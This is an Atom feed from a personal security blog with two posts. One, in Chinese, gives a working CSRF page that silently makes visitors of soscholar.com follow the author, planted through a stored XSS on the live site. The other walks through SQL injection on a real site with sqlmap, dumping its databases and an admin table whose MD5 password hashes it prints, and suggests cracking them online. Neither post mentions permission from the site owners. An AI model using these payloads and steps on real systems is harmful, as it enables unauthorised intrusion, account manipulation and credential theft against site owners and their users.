<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Security | Bits and Bytes]]></title>
  <link href="http://liaowang11.github.com/blog/categories/security/atom.xml" rel="self"/>
  <link href="http://liaowang11.github.com/"/>
  <updated>2013-05-19T16:12:17+08:00</updated>
  <id>http://liaowang11.github.com/</id>
  <author>
    <name><![CDATA[wliao]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[CRSF on soscholar]]></title>
    <link href="http://liaowang11.github.com/blog/2013/05/19/crsf-on-soscholar/"/>
    <updated>2013-05-19T15:38:00+08:00</updated>
    <id>http://liaowang11.github.com/blog/2013/05/19/crsf-on-soscholar</id>
    <content type="html"><![CDATA[<p>今天我们看看OWASP TOP10的老四CRSF.</p>

<p>现在这种类型的漏洞越来越多,即使是<a href="http://incompleteness.me/blog/2007/01/01/csrf-attacks-or-how-to-avoid-exposing-your-gmail-contacts/">GOOGLE</a>、<a href="http://homakov.blogspot.ru/2012/03/hacking-skrillformer-moneybookers.html">GITHUB</a>这样的大哥们也经常犯这种错误.个人感觉如果结合好XSS的话功能非常强大.</p>

<h2>小白鼠</h2>

<p>一如既往的<a href="http://soscholar.com">小白鼠</a>。</p>

<p>soscholar的个人主页上面有XSS，所以我们可以试着在用户打开个人主页时，悄悄地让他关注我。</p>

<h2>CRSF</h2>

<p>原理就不说了，参见<a href="https://en.wikipedia.org/wiki/Cross-site_request_forgery">wikipedia</a>或者<a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery">OWASP</a>。</p>

<p>我们来看看soscholar.com的关注请求。</p>

<p>``` http
POST /friend/save HTTP/1.1
Host: soscholar.com
Connection: keep-alive
Content-Length: 63
Accept: <em>/</em>
Origin: http://soscholar.com
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.22 (KHTML,
like Gecko) Ubuntu Chromium/25.0.1364.160 Chrome/25.0.1364.160
Safari/537.22</p>

<p>follow_id=f035e41e-9ef0-11e1-962c-0025904b1f5a&amp;group_id=&amp;gname=
```</p>

<p>一个POST请求到/friend/save，数据为follow_id、group_id和gname，后面两个可以为空。<em>follow_id</em>就是个人的ID咯，在主页地址上可以看到。</p>

<p>那么我们先来测试一下，开<a href="http://www.jsbin.com">jsbin</a>：</p>

<p>``` html
&lt;!DOCTYPE html></p>

<!-- CSRF -->


<p><html>
<head>
<meta charset=utf-8 />
<title>JS Bin</title>
</head>
<body>
  <iframe name="container" frameborder="0"></iframe></p>

<script>
document.write('<form target="container" id="test" method="post" action="http://soscholar.com/friend/save"><input type="hidden" name="follow_id" value="6b879ba2-06f3-11e2-adc4-0025904b1f5a"><input type="hidden" name="group_id" value=""><input type="hidden" name="gname" value="">');
document.getElementById("test").submit();
</script>


<p></body>
</html>
```</p>

<p>运行可以看到它并没阻止CSRF，请求完成。如果已经关注返回repeat（貌似还可以自己关注自己：），否则返回Success。</p>

<h2>关注我</h2>

<p>现在我们需要找个地方使用上面的代码了。在个人主页上修改联系地址（XSS在这哦），绕过验证（我喜欢直接拷贝check_form函数，在console里重新声明，
然后修改HTML让点击调用去掉验证后的check_form2函数）。</p>

<p>不过这里有个问题，代码太长了，就算修改input的最长输入长度，数据库中保存的字段也不够长。所以我精简了一下代码，直接用iframe嵌入放在jsbin
上的代码。</p>

<h2>结语</h2>

<p>最终的结果可以见<a href="http://soscholar.com/user_profile?user_id=6b879ba2-06f3-11e2-adc4-0025904b1f5a">socholar.com</a>和<a href="http://jsbin.com/erimiw/2/edit">jsbin.com</a>。</p>

<p>CSRF相对其他漏洞来说要麻烦很多，网上有很多措施。其中比较常见的是生成随机数，在COOKIE和REQUEST字段中同时设置，每个请求都要验证两者是相同的。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to hack a site?]]></title>
    <link href="http://liaowang11.github.com/blog/2013/04/16/how-to-hack-a-site/"/>
    <updated>2013-04-16T20:56:00+08:00</updated>
    <id>http://liaowang11.github.com/blog/2013/04/16/how-to-hack-a-site</id>
    <content type="html"><![CDATA[<p>I'm quite new to web security. But today, I want to show you how to
hack a site and try best to get privilege.</p>

<h2>Spot Flaws</h2>

<p>There are million ways to find flaws in web sites. Anyway, we should
firstly be familiar with the commons ones. IMHO, the best reference is
<a href="https://www.owasp.org/index.php/Main_Page">OWASP</a>.</p>

<p>OWASP
<a href="https://www.owasp.org/index.php/Top_10_2013-T10">top ten application security risks</a>
are:</p>

<ol>
<li>Injection flaws.</li>
<li>Broken Authentication and Session Management.</li>
<li>XSS(Cross Site Scripting).</li>
<li>Insecure Direct Object Reference.</li>
<li>Security Misconfiguration.</li>
<li>Sensitive Data Exposure.</li>
<li>Missing Function Level Access Control.</li>
<li>CSRF(Cross Site Request Forgery).</li>
<li>Using Components with known vulnerabilities.</li>
<li>Unvalidated Redirects and Forwards.</li>
</ol>


<p>These flaws while stand alone but are often tightly related which
when integrated poses greater risk. As I'm lazy and impatient, I often
just check the top five ones.</p>

<h2>Injection Flaws</h2>

<p>Almost everyone knows about
<a href="http://en.wikipedia.org/wiki/SQL_Injection">SQL Injection</a>. It's also
our main role today. If you are not so familiar with <em>SQL Injection</em>,
it's best to read the article on wikipedia and
<a href="https://www.owasp.org/index.php/SQL_Injection">OWASP</a>.</p>

<h2>Identify Injection Flaws</h2>

<p>I often test injection flaws manually by inspecting the parameters in
<em>GET</em> or <em>POST</em>. This filters quite a few potential targets, but it's
off top here.</p>

<p>The simplest test vector goest like:
<code>
http://mysite.com/para=1' or '1'='1' --'
</code>
It's your luck if the site doesn't turn error debugging information
off.</p>

<p>So, here we go:
<code>
http://some.com/questions?question_id=1'%20or%201=1
</code>
And we get:
```
A Database Error Occurred</p>

<p>Error Number: 1064</p>

<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''and type='Q'' at line 1</p>

<p>SELECT * FROM t_qa_post WHERE id='1' or 1=1'and type='Q'</p>

<p>Filename: /srv/www/default/models/t_db_model.php</p>

<p>Line Number: 340
<code>
Cool. The error is just what we want.
A better one goes like:
</code>
http://some.com/question?question_id=1'%20or%201=1--'
```
This dumps all the questions. And we can at this point confirm the
existence of injection flaws here.</p>

<h2>Automation</h2>

<p>There is no way you are willing to type all the test vectors into the
parameters to get useful information. We need something to automate
this process.</p>

<p>Yeah, we got <a href="http://sqlmap.org/">sqlmap</a>. The best SQL injection
automation tools I've ever seen. Read the manual, and get your hands
dirty.</p>

<h2>Lend hands from sqlmap</h2>

<p>``` bash</p>

<h1>dump databases</h1>

<p>$ ./sqlmap.py -u
'http://some.com/questions?question_id=1' -p
question_id --answers=follow=N --dbs</p>

<h1>dump admins</h1>

<p>$ sqlmap.py -u 'http://some.com/questions?question_id=1' -p question_id --answers=follow=N -D svowdb_20120910 -T t_admin --dump
recognized possible password hashes in column 'passwd'. Do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: svowdb_20120910
Table: t_admin
[2 entries]
+--------------------------------------+----------------------------------+-----------+
| id                                   | passwd                           | nickname  |
+--------------------------------------+----------------------------------+-----------+
| 795bae94-afbe-11e1-94f9-bcaec51b9163 | 10032586bc62852d2a7ed121da58d05f | sab       |
| 84290d62-afbe-11e1-94f9-bcaec51b9163 | 4f490fc6fad84a18aa7a62dd00da7bf9 | yoyoooooo |
+--------------------------------------+----------------------------------+-----------+
```</p>

<h2>Reverse MD5 hash</h2>

<p>Obviously the passwords as md5 hashed. There is no way but to
decrypt the hashes. I don't want to do it on my own, so I often search
online md5 hash databases. The best I found is
<a href="http://www.md5decrypter.co.uk/">md5decryptor</a>.</p>

<h2>Privilege Elevation</h2>

<p>It's quite a pity that current database user got no privileges(Plus
one for the right choice here :).
```
$ sqlmap.py -u 'http://some.com/questions?question_id=1' -p question_id --answers=follow=N --privileges
database management system users privileges:
[*] 'php'@'%' [1]:</p>

<pre><code>privilege: USAGE
</code></pre>

<p>```
With more privilege, we can even dump files, execute arbitrary code,
almost everything.</p>

<p>If I find one, there maybe one more post.</p>

<p>Happy injecting!</p>
]]></content>
  </entry>
  
</feed>
